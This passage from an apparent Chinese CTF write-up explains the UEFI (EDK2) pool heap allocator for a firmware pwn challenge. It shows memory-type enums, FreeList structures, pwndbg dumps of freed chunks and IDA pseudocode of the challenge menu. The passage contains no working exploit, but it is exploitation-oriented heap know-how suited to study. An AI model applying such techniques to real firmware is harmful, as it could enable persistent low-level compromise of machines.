class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>EfiMemoryType</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// Enumeration of memory types introduced in UEFI.</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Not used.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiReservedMemoryType,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// The code portions of a loaded application.</span></span><br><span class="line">  <span class="comment">/// (Note that UEFI OS loaders are UEFI applications.)</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiLoaderCode,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// The data portions of a loaded application and the default data allocation</span></span><br><span class="line">  <span class="comment">/// type used by an application to allocate pool memory.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiLoaderData,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// The code portions of a loaded Boot Services Driver.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiBootServicesCode,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// The data portions of a loaded Boot Serves Driver, and the default data</span></span><br><span class="line">  <span class="comment">/// allocation type used by a Boot Services Driver to allocate pool memory.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiBootServicesData,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// The code portions of a loaded Runtime Services Driver.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiRuntimeServicesCode,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// The data portions of a loaded Runtime Services Driver and the default</span></span><br><span class="line">  <span class="comment">/// data allocation type used by a Runtime Services Driver to allocate pool memory.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiRuntimeServicesData,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Free (unallocated) memory.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiConventionalMemory,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Memory in which errors have been detected.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiUnusableMemory,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Memory that holds the ACPI tables.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiACPIReclaimMemory,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Address space reserved for use by the firmware.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiACPIMemoryNVS,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Used by system firmware to request that a memory-mapped IO region</span></span><br><span class="line">  <span class="comment">/// be mapped by the OS to a virtual address so it can be accessed by EFI runtime services.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiMemoryMappedIO,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// System memory-mapped IO region that is used to translate memory</span></span><br><span class="line">  <span class="comment">/// cycles to IO cycles by the processor.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiMemoryMappedIOPortSpace,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Address space reserved by the firmware for code that is part of the processor.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiPalCode,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// A memory region that operates as EfiConventionalMemory,</span></span><br><span class="line">  <span class="comment">/// however it happens to also support byte-addressable non-volatility.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiPersistentMemory,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// A memory region that describes system memory that has not been accepted</span></span><br><span class="line">  <span class="comment">/// by a corresponding call to the underlying isolation architecture.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiUnacceptedMemoryType,</span><br><span class="line">  EfiMaxMemoryType,</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// +---------------------------------------------------+</span></span><br><span class="line">  <span class="comment">// | 0..(EfiMaxMemoryType - 1)    - Normal memory type |</span></span><br><span class="line">  <span class="comment">// +---------------------------------------------------+</span></span><br><span class="line">  <span class="comment">// | EfiMaxMemoryType..0x6FFFFFFF - Invalid            |</span></span><br><span class="line">  <span class="comment">// +---------------------------------------------------+</span></span><br><span class="line">  <span class="comment">// | 0x70000000..0x7FFFFFFF       - OEM reserved       |</span></span><br><span class="line">  <span class="comment">// +---------------------------------------------------+</span></span><br><span class="line">  <span class="comment">// | 0x80000000..0xFFFFFFFF       - OS reserved        |</span></span><br><span class="line">  <span class="comment">// +---------------------------------------------------+</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  MEMORY_TYPE_OEM_RESERVED_MIN = <span class="number">0x70000000</span>,</span><br><span class="line">  MEMORY_TYPE_OEM_RESERVED_MAX = <span class="number">0x7FFFFFFF</span>,</span><br><span class="line">  MEMORY_TYPE_OS_RESERVED_MIN  = <span class="number">0x80000000</span>,</span><br><span class="line">  MEMORY_TYPE_OS_RESERVED_MAX  = <span class="number">0xFFFFFFFF</span></span><br><span class="line">&#125; EFI_MEMORY_TYPE;</span><br></pre></td></tr></table></figure><p>在每个 POOL 结构体中有一个 FreeList 数组用于存储被释放的堆块双向链表，类似于 ptmalloc 中 unosrtedbin &#x2F; smallbin &#x2F; largebin，不过遵循后进先出。当某个 FreeList 为空时 ForwardLink 和 BackLink 指向该 FreeList 自身，FreeList 的初始化代码如下：    </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  Called to initialize the pool.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line">VOID</span><br><span class="line"><span class="title function_">CoreInitializePool</span> <span class="params">(</span></span><br><span class="line"><span class="params">  VOID</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">  UINTN  Type;</span><br><span class="line">  UINTN  Index;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (Type = <span class="number">0</span>; Type &lt; EfiMaxMemoryType; Type++) &#123;</span><br><span class="line">    mPoolHead[Type].Signature  = <span class="number">0</span>;</span><br><span class="line">    mPoolHead[Type].Used       = <span class="number">0</span>;</span><br><span class="line">    mPoolHead[Type].MemoryType = (EFI_MEMORY_TYPE)Type;</span><br><span class="line">    <span class="keyword">for</span> (Index = <span class="number">0</span>; Index &lt; MAX_POOL_LIST; Index++) &#123;</span><br><span class="line">      InitializeListHead (&amp;mPoolHead[Type].FreeList[Index]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  Initializes the head node of a doubly-linked list, and returns the pointer to</span></span><br><span class="line"><span class="comment">  the head node of the doubly-linked list.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Initializes the forward and backward links of a new linked list. After</span></span><br><span class="line"><span class="comment">  initializing a linked list with this function, the other linked list</span></span><br><span class="line"><span class="comment">  functions may be used to add and remove nodes from the linked list. It is up</span></span><br><span class="line"><span class="comment">  to the caller of this function to allocate the memory for ListHead.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  If ListHead is NULL, then ASSERT().</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @param  ListHead  A pointer to the head node of a new doubly-linked list.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @return ListHead</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line">LIST_ENTRY *</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">InitializeListHead</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN OUT  LIST_ENTRY  *ListHead</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  ASSERT (ListHead != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  ListHead-&gt;ForwardLink = ListHead;</span><br><span class="line">  ListHead-&gt;BackLink    = ListHead;</span><br><span class="line">  <span class="keyword">return</span> ListHead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>FreeList 的每个下标对应着不同的 size  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Each element is the sum of the 2 previous ones: this allows us to migrate</span></span><br><span class="line"><span class="comment">// blocks between bins by splitting them up, while not wasting too much memory</span></span><br><span class="line"><span class="comment">// as we would in a strict power-of-2 sequence</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">STATIC CONST UINT16  mPoolSizeTable[] = &#123;</span><br><span class="line">  <span class="number">128</span>, <span class="number">256</span>, <span class="number">384</span>, <span class="number">640</span>, <span class="number">1024</span>, <span class="number">1664</span>, <span class="number">2688</span>, <span class="number">4352</span>, <span class="number">7040</span>, <span class="number">11392</span>, <span class="number">18432</span>, <span class="number">29824</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>总的来说堆管理器的结构如下：  </p><img src="/2025/01/06/uefi2/4.png" class="" title="我的图图呢">  <p>申请出来的堆块会给加上堆块头 POOL_HEAD 和堆块尾 POOL_TAIL，而堆块被释放后堆块尾会给弃用，堆块头会给修改为 POOL_FREE</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  UINT32        Signature;</span><br><span class="line">  UINT32        Index;</span><br><span class="line">  LIST_ENTRY    Link;</span><br><span class="line">&#125; POOL_FREE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  UINT32             Signature;</span><br><span class="line">  UINT32             Reserved;</span><br><span class="line">  EFI_MEMORY_TYPE    Type;</span><br><span class="line">  UINTN              Size;</span><br><span class="line">  CHAR8              Data[<span class="number">1</span>];</span><br><span class="line">&#125; POOL_HEAD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  UINT32    Signature;</span><br><span class="line">  UINT32    Reserved;</span><br><span class="line">  UINTN     Size;</span><br><span class="line">&#125; POOL_TAIL;</span><br></pre></td></tr></table></figure><p>每当我们用 gBS-&gt;AllocatePool(type, BufferSize, Buffer) 申请一个堆块时，会首先将 BufferSize 进行八字节对齐，然后加上堆块头和堆块尾的大小。然后根据 type 找到对应的 POOL，然后再根据更新后的 size 找到对应的 FreeList。如果该 FreeList 不为空就直接从上面获取堆块并设置 POOL_HEAD 和 POOL_TAIL。如果 FreeList 为空，则从堆空间开辟新的堆块。<br>调用 gBS-&gt;FreePool 的操作则与之相反，同样是先同过 type 和 size 找到对应的 POOL 的 FreeList，然后将 POOL_HEAD 修改为 POOL_FREE 并将其链入 FreeList 中，这中间还有很多的细节，虽然在这道题目中用不上，不过如果仔细研究的话也许我们就能够在十分苛刻的条件下构造很极致的堆风水来实现漏洞的利用（等我考完研后看看能不能出在 WMCTF 上😚😚😚）  </p><p>我利用的题目的程序申请了 name 和 desc，name 为 0x10 个 a，desc 为 0x20 个 b，内存布局如下：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x2b552f00</span><br><span class="line">0x2b552f00:     0x0000000130646870      0x0000000000000000  &lt;---- name (using)</span><br><span class="line">0x2b552f10:     0x0000000000000040      0x6161616161616161  </span><br><span class="line">0x2b552f20:     0x6161616161616161      0xafafafafafafaf00</span><br><span class="line">0x2b552f30:     0xafafafaf6c617470      0x0000000000000040</span><br><span class="line">0x2b552f40:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f50:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f60:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f70:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f80:     0x0000000030646870      0x0000000000000000  &lt;---- desc (using)</span><br><span class="line">0x2b552f90:     0x0000000000000060      0x6262626262626262</span><br><span class="line">0x2b552fa0:     0x6262626262626262      0x6262626262626262</span><br><span class="line">0x2b552fb0:     0x6262626262626262      0xafafafafafafaf00</span><br><span class="line">0x2b552fc0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552fd0:     0xafafafaf6c617470      0x0000000000000060</span><br></pre></td></tr></table></figure><p>再将这个两个堆块释放后的内存空间如下：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x2b552f00</span><br><span class="line">0x2b552f00:     0x0000000030726670      0x000000002b8c9e18  &lt;---- name (freed)</span><br><span class="line">0x2b552f10:     0x000000002b552f88      0xafafafafafafafaf</span><br><span class="line">0x2b552f20:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f30:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f40:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f50:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f60:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f70:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f80:     0x0000000030726670      0x000000002b552f08  &lt;---- desc (freed)</span><br><span class="line">0x2b552f90:     0x000000002b8c9e18      0xafafafafafafafaf</span><br><span class="line">0x2b552fa0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552fb0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552fc0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552fd0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br></pre></td></tr></table></figure><p>可以发现其内存空间与我们上面所分析的一致，此时该 FreeList 的结构大致如下：  </p><img src="/2025/01/06/uefi2/6.png" class="" title="我的图图呢">  <h3 id="恢复了部分符号的IDA伪代码-1"><a href="#恢复了部分符号的IDA伪代码-1" class="headerlink" title="恢复了部分符号的IDA伪代码"></a>恢复了部分符号的IDA伪代码</h3><p>这里依然给出恢复了 UiApp 组件部分符号的 IDA 伪代码，仅供参考 :)  </p><h4 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">pwn</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 StrLength; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v3; <span class="comment">// r9</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v6; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// r9</span></span><br><span class="line">  __int64 v8; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">116</span>]; <span class="comment">// [rsp+28h] [rbp-138h] BYREF</span></span><br><span class="line">  <span class="type">char</span> AdministratorName[<span class="number">131</span>]; <span class="comment">// [rsp+9Ch] [rbp-C4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">65</span>]; <span class="comment">// [rsp+11Fh] [rbp-41h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">    SystemTable-&gt;ConOut,</span><br><span class="line">    <span class="number">9</span>i64);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *))SystemTable-&gt;ConOut-&gt;ClearScreen)(SystemTable-&gt;ConOut);</span><br><span class="line">  Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;** Loading D^3 BIOS GUARD ... **\n\n&quot;</span>);</span><br><span class="line">  OutputTitle();</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">    SystemTable-&gt;ConOut,</span><br><span class="line">    <span class="number">15</span>i64);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;\nPlease select your role.\n(1. Administrator 2. Visitor): &quot;</span>);</span><br><span class="line">      choice = inputNum();</span><br><span class="line">      <span class="keyword">if</span> ( choice != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      Output(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">      Input(AdministratorName, (<span class="type">int</span>)&amp;byte_40[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">if</span> ( checkUser(<span class="string">&quot;A&quot;</span>, AdministratorName) )</span><br><span class="line">      &#123;</span><br><span class="line">        Output(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">          SystemTable-&gt;ConOut,</span><br><span class="line">          <span class="number">4</span>i64);</span><br><span class="line">        Output((<span class="type">unsigned</span> __int8 *)AdministratorName);</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">          SystemTable-&gt;ConOut,</span><br><span class="line">          <span class="number">15</span>i64);</span><br><span class="line">        Output(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;Pass key: &quot;</span>);</span><br><span class="line">        InputKey(v12, <span class="number">0x41</span>u, <span class="number">0x2A</span>u);</span><br><span class="line">        sub_16C58(v10);</span><br><span class="line">        StrLength = GetStrLength(v12);</span><br><span class="line">        sub_16B21((__int64)v12, StrLength, v2, v3);</span><br><span class="line">        sub_16A1A(v5, v4, v6, v7);</span><br><span class="line">        <span class="keyword">if</span> ( !checkKey(v8, <span class="number">32</span>i64) )</span><br><span class="line">        &#123;</span><br><span class="line">          ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">            SystemTable-&gt;ConOut,</span><br><span class="line">            <span class="number">2</span>i64);</span><br><span class="line">          Output(<span class="string">&quot;S&quot;</span>);</span><br><span class="line">          ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">            SystemTable-&gt;ConOut,</span><br><span class="line">            <span class="number">15</span>i64);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">        &#125;</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">          SystemTable-&gt;ConOut,</span><br><span class="line">          <span class="number">4</span>i64);</span><br><span class="line">        Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;Sorry, You don&#x27;t have permission!\n&quot;</span>);</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">          SystemTable-&gt;ConOut,</span><br><span class="line">          <span class="number">15</span>i64);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( choice != <span class="number">2</span> );</span><br><span class="line">  <span class="keyword">return</span> Visitor();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Visitor"><a href="#Visitor" class="headerlink" title="Visitor"></a>Visitor</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">Visitor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          VisitorMenu();</span><br><span class="line">          v0 = inputNum();</span><br><span class="line">          <span class="keyword">if</span> ( v0 != <span class="number">3</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          clearUser();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v0 &gt; <span class="number">3</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          Add();</span><br><span class="line">        &#125;</span><br><span class="line">        <span 